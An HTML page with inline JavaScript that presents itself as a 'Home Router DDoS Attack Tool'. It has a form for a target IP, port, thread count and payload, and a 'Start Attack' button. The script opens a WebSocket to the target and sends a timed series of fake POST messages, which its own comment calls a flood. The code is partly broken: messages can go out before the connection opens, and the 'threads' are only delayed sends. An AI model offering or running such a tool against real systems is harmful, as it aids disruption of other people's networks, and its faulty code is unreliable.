<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Home Router DDoS Attack Tool</title>
  <style>
    /* Same CSS as before */
  </style>
</head>
<body>
  <div class="container">
    <h1>Home Router DDoS Attack Tool</h1>
    <form id="ddos-form">
      <div class="form-group">
        <label for="ip">Target IP:</label>
        <input type="text" id="ip" name="ip" required>
      </div>
      <div class="form-group">
        <label for="port">Port:</label>
        <input type="number" id="port" name="port" required>
      </div>
      <div class="form-group">
        <label for="threads">Threads:</label>
        <input type="number" id="threads" name="threads" min="1" value="10">
      </div>
      <div class="form-group">
        <label for="payload">Payload:</label>
        <textarea id="payload" name="payload" rows="5"></textarea>
      </div>
      <button type="submit" class="btn btn-primary">Start Attack</button>
    </form>
    <div class="output" id="output"></div>
    <div class="footer">
      <p>Created with love by [Your Name]</p>
    </div>
  </div>

  <script>
    document.getElementById('ddos-form').addEventListener('submit', async (e) => {
      e.preventDefault();

      const ip = document.getElementById('ip').value;
      const port = document.getElementById('port').value;
      const threads = document.getElementById('threads').value;
      const payload = document.getElementById('payload').value;

      try {
        await startAttack(ip, port, threads, payload);
      } catch (error) {
        console.error(error);
        alert('Error starting attack');
      }
    });

    async function startAttack(ip, port, threads, payload) {
      const output = document.getElementById('output');
      output.innerHTML = '';

      const socket = new WebSocket(`ws://${ip}:${port}`);

      socket.onopen = () => {
        output.innerHTML += `<p>Connected to ${ip}:${port}</p>`;
      };

      socket.onerror = (error) => {
        output.innerHTML += `<p>Error: ${error.message}</p>`;
      };

      socket.onclose = () => {
        output.innerHTML += `<p>Disconnected from ${ip}:${port}</p>`;
      };

      // Send a flood of requests with the specified payload
      for (let i = 0; i < threads; i++) {
        setTimeout(() => {
          sendRequest(socket, payload);
        }, i * 100);
      }
    }

    function sendRequest(socket, payload) {
      const data = {
        method: 'POST',
        url: '/',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Connection': 'keep-alive',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: payload
      };

      socket.send(JSON.stringify(data));
    }
  </script>
</body>
</html>
